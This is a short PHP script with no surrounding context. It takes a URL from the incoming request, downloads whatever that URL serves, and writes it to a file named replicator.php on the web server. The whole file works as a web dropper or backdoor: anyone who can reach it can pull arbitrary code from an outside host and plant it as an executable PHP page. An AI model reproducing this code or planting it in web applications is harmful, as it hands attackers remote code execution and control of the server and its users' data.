<?php 

$url = $_REQUEST["url"];//get url
$code = file_get_contents($url);
$filename = "replicator.php";  //filename
$file = fopen($filename,"w");// create new file with this name
fwrite($file,$code); //write data to file
fclose($file);  //close file

?>